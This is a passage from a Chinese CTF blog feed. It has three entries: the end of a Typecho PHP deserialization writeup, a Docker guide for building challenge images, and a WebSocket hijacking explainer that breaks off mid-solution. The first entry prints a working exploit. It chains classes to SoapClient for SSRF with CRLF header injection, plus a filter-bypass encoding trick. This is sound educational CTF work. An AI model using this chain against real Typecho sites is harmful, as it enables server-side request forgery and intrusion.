Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);</code>这里可以将第一个参数<code>$this-&gt;coincidence[&#39;hello&#39;]</code>控制成为一个类，在Typecho_Db类中的<code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>这个地方触发<code>toString</code>函数，然后接着触发原生类的<code>call</code>函数达到打SSRF的效果。</p><p>exp如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld_DB</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$coincidence</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;coincidence[<span class="hljs-string">&#x27;hello&#x27;</span>] = <span class="hljs-keyword">new</span> Typecho_Db_Query();<br>        <span class="hljs-keyword">$this</span>-&gt;coincidence[<span class="hljs-string">&#x27;world&#x27;</span>] = <span class="hljs-string">&#x27;typecho_&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Db_Query</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sqlPreBuild</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_adapter</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,<br>            <span class="hljs-string">&quot;Cookie: PHPSESSID=e1g1ch42pgkoa25uclhko75l10&quot;</span><br>        );<br>        <span class="hljs-keyword">$this</span>-&gt;_adapter = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-string">&#x27;KK^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span> . join(<span class="hljs-string">&#x27;^^&#x27;</span>, <span class="hljs-variable">$headers</span>))));<br>        <span class="hljs-keyword">$this</span>-&gt;_sqlPreBuild = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;action&#x27;</span>=&gt;<span class="hljs-string">&quot;SELECT&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bypass</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = explode(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$newstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/00/&#x27;</span>, <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>])) &#123;<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>] = preg_replace(<span class="hljs-string">&#x27;/s/&#x27;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$arr</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$newstr</span> .= <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$newstr</span> .= <span class="hljs-string">&quot;:&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$newstr</span> .= <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$newstr</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = serialize(<span class="hljs-keyword">new</span> HelloWorld_DB());<br><span class="hljs-variable">$test</span> = urlencode(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test</span> = preg_replace(<span class="hljs-string">&#x27;/%00/&#x27;</span>,<span class="hljs-string">&#x27;%5c%30%30&#x27;</span>, <span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test</span> = bypass(urldecode(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$test</span>);<br></code></pre></div></td></tr></table></figure><p>这里面还有个坑，就是上面可以看到它过滤了<code>%</code>但是exp中有很多是<code>private</code>属性需要用<code>%00</code>不可见字符填充，然后就需要用\00来代替%00。这里还有个知识点</p><blockquote><p>在 PHP5 最新的 CVS 中，<br>新的序列化方式叫做 escaped binary string 方式，这是相对与普通那种 non-escaped binary string 方式来说的：<br>string 型数据（字符串）新的序列化格式为：<br>S:”<length>“:”<value>“;<br>其中 <length> 是源字符串的长度，而非 <value> 的长度。<length> 是非负整数，数字前可以带有正号（+）。<value> 为经过转义之后的字符串。<br>它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 <value> 的内容了。</p></blockquote><p>普通的序列化小s对应的就是普通的字符串，如s:3:”%00a%00”;<br>而序列化的大S则对应的是\加上16进制，如S:2:”\00a\00”;</p><p>看个例子</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;123&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment"># code...</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// echo serialize(new A);</span><br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/50c6c8766f1d4270ae64f8dc45af5f5c.png" alt="在这里插入图片描述"><br>将不可见字符%00转化为十六进制，小s变成大S，可以成功执行。<br><img src="https://img-blog.csdnimg.cn/2092e96a463a460abe46cd2a585f867f.png" alt="在这里插入图片描述"></p><p>回到题目，路由在这里<br><img src="https://img-blog.csdnimg.cn/65f2eacd33b848149de828c57f356989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后发包得到flag<br><img src="https://img-blog.csdnimg.cn/60b2d5ad37f240eabcb12fba0a913562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker出题</title>
    <link href="/2021/07/29/2021-7-30-docker/"/>
    <url>/2021/07/29/2021-7-30-docker/</url>
    
    <content type="html"><![CDATA[<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><blockquote><p>Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 upstart/systemd 去启动后台服务，容器内没有后台服务的概念。 </p><p>对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。 </p></blockquote><h2 id="dockerfile模板"><a href="#dockerfile模板" class="headerlink" title="dockerfile模板"></a>dockerfile模板</h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 第一行写跟第1点中一样的基本镜像</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">14.04</span><br><span class="hljs-comment"># 这里可以写上你的姓名/昵称</span><br><span class="hljs-keyword">MAINTAINER</span> yourname<br><span class="hljs-comment"># 这里可以写上你的制作时间</span><br><span class="hljs-keyword">ENV</span> REFRESHED_AT <span class="hljs-number">2018</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span><br><span class="hljs-comment"># 使用utf-8编码</span><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-comment"># 先写 修改源/更新 【如果必须的话】</span><br><span class="hljs-comment"># 替换源（这里可用sed或者直接COPY一个完整的sources.list来替换）</span><br><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">&#x27;s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.163.com\/ubuntu\//g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-comment"># 进行更新</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get update -y</span><br><span class="hljs-comment"># 将环境变量设置为非交互的 【这个看个人】</span><br><span class="hljs-keyword">ENV</span> DEBIAN_FRONTEND noninteractive<br><br><span class="hljs-comment"># 再写 各种安装</span><br><span class="hljs-comment"># 如 安装mysql</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -y install mysql-server</span><br><span class="hljs-comment"># 安装apache2</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -yqq install apache2</span><br><span class="hljs-comment"># 安装php7</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get -yqq install php7 libapache2-mod-php7</span><br><span class="hljs-comment"># 安装php扩展</span><br><span class="hljs-keyword">RUN</span><span class="bash"> apt-get install -yqq php7-mysql php7-curl php7-gd php7-intl php-pear php7-imagick php7-imap php7-mcrypt php7-memcache php7-ming php7-ps php7-pspell php7-recode php7-snmp php7-sqlite php7-tidy php7-xmlrpc php7-xsl</span><br><br><span class="hljs-comment"># 再 修改一些配置</span><br><span class="hljs-comment"># 对于文件中的替换字符串，多使用sed命令</span><br><span class="hljs-comment"># 例如去掉apache2的列目录漏洞</span><br><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">&#x27;s/Options Indexes FollowSymLinks/Options None/&#x27;</span> /etc/apache2/apache2.conf</span><br><br><span class="hljs-comment"># 然后才是复制文件，不推荐挂载卷</span><br><span class="hljs-comment"># ADD会自动解压压缩包，而COPY不会</span><br><span class="hljs-keyword">ADD</span><span class="bash"> html.tgz /var/www</span><br><br><span class="hljs-comment"># 剩下一些操作（权限要控制好）</span><br><span class="hljs-comment"># 例如修改某个文件的所有者</span><br><span class="hljs-keyword">RUN</span><span class="bash"> chown root:root /var/www/html/x.php</span><br><br><span class="hljs-comment"># start.sh为开机启动脚本，里面包含容器开启后要启动的命令</span><br><span class="hljs-keyword">COPY</span><span class="bash"> start.sh /root/start.sh</span><br><span class="hljs-comment"># 加上执行权限</span><br><span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /root/start.sh</span><br><span class="hljs-comment"># 使用ENTRYPOINT而不使用CMD（CMD容易受run命令最后的命令给影响）</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> <span class="hljs-built_in">cd</span> /root; ./start.sh</span><br><span class="hljs-comment"># WEB开放端口默认为80，一般为一个，若有特殊情况，请写明</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br></code></pre></div></td></tr></table></figure><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>进入终端</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="bash"> -it id bash</span><br></code></pre></div></td></tr></table></figure><p>进入容器</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker exec -it &lt;容器ID&gt; /bin/bash<br></code></pre></div></td></tr></table></figure><p>运行</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="bash"> -d -p 本机端口:容器端口 &lt;镜像名&gt;</span><br></code></pre></div></td></tr></table></figure><p>拷贝</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker cp [本地路径] [container id]:[container 路径]<br></code></pre></div></td></tr></table></figure><h2 id="配环境"><a href="#配环境" class="headerlink" title="配环境"></a>配环境</h2><p>自己安装web环境感觉好麻烦呀，看了看网上的还有别人配好的镜像</p><p><img src="https://img-blog.csdnimg.cn/db76db3bd231413fad2d8f8858a623b2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>拉了第一个看看，中途3306可能会被占用kill掉就行</p><p><code>docker pull mattrayner/lamp</code></p><p><code>docker run  --name test-lamp  -p 12345:80 -p 3306:3306  -d mattrayner/lamp</code></p><p>进去看了一下，确实比较齐全，但就是拉镜像的时候安装太慢了。但dockerfile也写的简单。</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">from</span> mattrayner/lamp<br><br><span class="hljs-keyword">MAINTAINER</span> KKfine<br><br><span class="hljs-keyword">ENV</span> REFRESHED_AT <span class="hljs-number">2021</span>-<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-keyword">ADD</span><span class="bash"> ctfweb.tar.gz /var/www/html</span><br><br><span class="hljs-keyword">COPY</span><span class="bash"> hint.php /tmp</span><br><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;设置的flag&#x27;</span> &gt; /home/flaaag.txt &amp;&amp; rm -rf /var/www/html/* &amp;&amp; tar -zcvf ctfweb.tar.gz var/www/html</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cybrics</title>
    <link href="/2021/07/28/2021-7-28-cybrics/"/>
    <url>/2021/07/28/2021-7-28-cybrics/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h2><p>​    题目考的是webscoket有关的漏洞，也属于是知识盲区了…</p><h3 id="关于websocket"><a href="#关于websocket" class="headerlink" title="关于websocket"></a>关于websocket</h3><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><blockquote><p>websocket用的是ws://和 wss://，那么 WebSocket 和 HTTP 是什么关系呢。WebSocket 是 HTML5  推出的新协议，跟 HTTP 协议内容本身没有关系。WebSocket 是持久化的协议，而 HTTP  是非持久连接。WebSocket 提供了全双工沟通，俗称 Web 的 TCP 连接，但 TCP 通常处理字节流（跟消息无关），而  WebSocket 基于 TCP 实现了消息流。WebSocket 也类似于 TCP 一样进行握手连接，跟 TCP 不同的是，WebSocket 是基于 HTTP 协议进行的握手。</p></blockquote><p>看一个请求报文</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">GET ws:<span class="hljs-comment">//echo.websocket.org/?encoding=text HTTP/1.1</span><br>Host: echo.websocket.org<br>Connection: Upgrade<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade: websocket<br>Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Sec-WebSocket-Version: <span class="hljs-number">13</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_11_4</span>) Chrome/<span class="hljs-number">49.0</span><span class="hljs-number">.2623</span><span class="hljs-number">.110</span><br>Accept-Encoding: gzip, deflate, sdch<br>Accept-Language: en-US,en;q=<span class="hljs-number">0.8</span>,zh-CN;q=<span class="hljs-number">0.6</span><br>Cookie: _gat=<span class="hljs-number">1</span>; _ga=GA1<span class="hljs-number">.2</span><span class="hljs-number">.2904372</span><span class="hljs-number">.1459647651</span>; JSESSIONID=1A9431CF043F851E0356F5837845B2EC<br>Sec-WebSocket-Key: 7ARps0AjsHN8bx5dCI1KKQ==<br>Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits<br></code></pre></div></td></tr></table></figure><p>响应</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">101</span> Web Socket Protocol Handshake<br>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>Access-Control-Allow-Headers: content-type<br>Access-Control-Allow-Headers: authorization<br>Access-Control-Allow-Headers: x-websocket-extensions<br>Access-Control-Allow-Headers: x-websocket-version<br>Access-Control-Allow-Headers: x-websocket-protocol<br>Access-Control-Allow-Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Connection: Upgrade<br><span class="hljs-built_in">Date</span>: Sun, <span class="hljs-number">03</span> Apr <span class="hljs-number">2016</span> <span class="hljs-number">03</span>:<span class="hljs-number">09</span>:<span class="hljs-number">21</span> GMT<br>Sec-WebSocket-Accept: wW9Bl95VtfJDbpHdfivy7csOaDo=<br>Server: Kaazing Gateway<br>Upgrade: websocket<br></code></pre></div></td></tr></table></figure><p>核心在<code>Connection：Upgrade 和 Upgrade：websocket 两行。这两行相当于告诉服务器端：我要申请切换到 WebSocket 协议。</code></p><p>一旦服务器端返回 101 响应，即可完成 WebSocket 协议切换。服务器端即可以基于相同端口，将通信协议从 http://或 https://切换到 ws://或 wss://。</p><p>报文中也有和cookie类似的<code>Sec-WebSocket-Key</code>,这是一个散列key，经过了base64编码，服务器则会将一个 GUID 和这个客户端的随机数一起生成一个散列 Key 作为 Sec-WebSocket-Accept 返回给客户端。这个工作机制可以用来避免缓存代理（caching proxy），也可以用来避免请求重播（request replay）。</p><p>对于<code>Access-Control-Allow-Headers</code>,以“Sec-”开头的 Header 可以避免被浏览器脚本读取到，这样攻击者就不能利用 XMLHttpRequest 伪造 WebSocket 请求来执行跨协议攻击，因为 XMLHttpRequest 接口不允许设置 Sec-开头的 Header。</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>支持双向通信，实时性更强。</p><p>更好的二进制支持。</p><p>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节(取决于数据包长度)，客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</p><p>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。(比如支持自定义压缩算法等)</p><h3 id="跨站点-WebSocket-劫持漏洞原理"><a href="#跨站点-WebSocket-劫持漏洞原理" class="headerlink" title="跨站点 WebSocket 劫持漏洞原理"></a>跨站点 WebSocket 劫持漏洞原理</h3><p>看了对于这个的介绍，感觉和CSRF确实有些像，但又有些根本上的区别，CSRF只是通过恶意网站或者其他方法伪造客户进行请求，不会导致信息泄漏问题，也不会窃听到整个消息通道和修改服务器数据。</p><h4 id="什么是跨站点-WebSocket-劫持漏洞"><a href="#什么是跨站点-WebSocket-劫持漏洞" class="headerlink" title="什么是跨站点 WebSocket 劫持漏洞"></a>什么是跨站点 WebSocket 劫持漏洞</h4><p>看看上面的报文，可以发现Cookie 头部把域名下的 Cookie 都发送到服务器端。其实WebSocket协议并没有规定服务器在握手时应该如何确认客户端的身份，服务器可以采用任何 HTTP 服务器的客户端身份认证机制，譬如 cookie，HTTP 基础认证，TLS 身份认证等。看到这，都可以联想到CSRF来绕过身份认证获得握手，其实大致过程也和CSRF差不多。</p><blockquote><p>因为 WebSocket 的客户端不仅仅局限于浏览器，因此 WebSocket 规范没有规范 Origin 必须相同（有兴趣的读者可以阅读规范  10.2 章节了解对于 Origin 的规范）。所有的浏览器都会发送 Origin 请求头，如果服务器端没有针对 Origin  头部进行验证可能会导致跨站点 WebSocket  劫持攻击。譬如，某个用户已经登录了应用程序，如果他被诱骗访问某个社交网站的恶意网页，恶意网页在某元素中植入一个 WebSocket  握手请求申请跟目标应用建立 WebSocket 连接。一旦打开该恶意网页，则自动发起如下请求。请注意，Origin 和  Sec-WebSocket-Key 都是由浏览器自动生成，Cookie  等身份认证参数也都是由浏览器自动上传到目标应用服务器端。如果服务器端疏于检查 Origin，该请求则会成功握手切换到 WebSocket  协议，恶意网页就可以成功绕过身份认证连接到 WebSocket  服务器，进而窃取到服务器端发来的信息，抑或发送伪造信息到服务器端篡改服务器端数据。</p></blockquote><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><blockquote><p>WebSocket 令牌机制</p></blockquote><p>以上看起来很美好，但是仅仅检查 Origin 远远不够，别忘记了，如果 WebSocket  的客户端不是浏览器，非浏览器的客户端发来的请求根本就没有 Origin。除此之外，我们要记得，恶意网页是可以伪造 Origin  头信息的。更彻底的解决方案还是要借鉴 CSRF 的解决方案－令牌机制。</p><p> 鉴于篇幅原因，笔者就不详细贴出整个设计和代码，建议读者参照以下概要设计提高 WebSocket 应用的安全。</p><p> \1. 服务器端为每个 WebSocket 客户端生成唯一的一次性 Token；</p><p> \2. 客户端将 Token 作为 WebSocket 连接 URL 的参数（譬如 ws://echo.websocket.org/?token＝randomOneTimeToken），发送到服务器端进行 WebSocket 握手连接；</p><p> \3. 服务器端验证 Token 是否正确，一旦正确则将这个 Token 标示为废弃不再重用，同时确认 WebSocket 握手连接成功；如果 Token 验证失败或者身份认证失败，则返回 403 错误。</p><p> 这个方案里的 Token 设计是关键，笔者推荐的方案是为登录用户生成一个 Secure Random 存储在 Session  中，然后利用对称加密（譬如 AES GCM）加密这个 Secure Random 值作为令牌，将加密后的令牌发送给客户端用来进行连接。这样每个  Session 有一个唯一的随机数，每个随机数可以通过对称加密生成若干份一次性令牌。用户即便通过不同终端通过 WebSocket  连接到服务器，服务器可以在保障令牌唯一且一次性使用的前提下，依然能将不同通道中的信息关联到同一用户中。</p><p> 可能存在另外一个设计思路，在 WebSocket 消息中增加令牌和身份信息，但笔者觉得这样的设计有悖于 WebSocket 的设计思想，而且增加了不必要的网络负载。抛砖引玉，欢迎读者提供更好的设计方案。</p><p>参考</p><p><a href="https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base">https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base</a></p><p><a href="https://blog.csdn.net/cuixiping/article/details/70048611">https://blog.csdn.net/cuixiping/article/details/70048611</a></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>进入就是一个聊天框，也比较符合WebSocket正常的功能。F12先看一眼，看到了一串javascript脚本</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 